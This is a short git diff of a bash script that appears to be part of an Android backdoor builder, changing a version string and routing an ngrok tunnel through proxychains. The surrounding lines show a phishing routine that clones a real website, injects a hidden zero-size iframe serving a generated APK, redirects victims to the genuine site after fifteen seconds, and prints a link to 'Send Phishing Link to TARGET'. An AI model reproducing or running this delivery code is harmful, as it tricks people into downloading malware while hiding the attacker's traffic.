@@ -12,7 +12,7 @@ WHITE="\u001b[37m"
 YELLOW="\u001b[33m"
 
 
-version="73"
+version="72"
 apktool_version="2.6.1-dirty"
 TORRC=$(cat /etc/tor/torrc|grep -o "UseBridges 1")
 NoIP=$1
@@ -363,7 +363,7 @@ function PHISHING()
 	mv "$OUTPUT-b.apk" /var/www/html/
 	wget -O /var/www/html/index.html -c -k -q -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "$URL"
 	sed -i "s#</body>#<iframe id='frame' src='$OUTPUT-b.apk' application='yes' width=0 height=0 style='hidden' frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>\n<script type='text/javascript'>setTimeout(function(){window.location.href='$URL';}, 15000);</script>\n</body>#g" /var/www/html/index.html
-	ngrok http 80 > /dev/null
+	proxychains ngrok http 80 > /dev/null
 	sleep 10
 	NGROK=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:\/\/([^"]*).*/\1/p')
 	echo -e "$GREEN [*]$YELLOW Send Phishing Link to TARGET: https://$NGROK$WHITE"
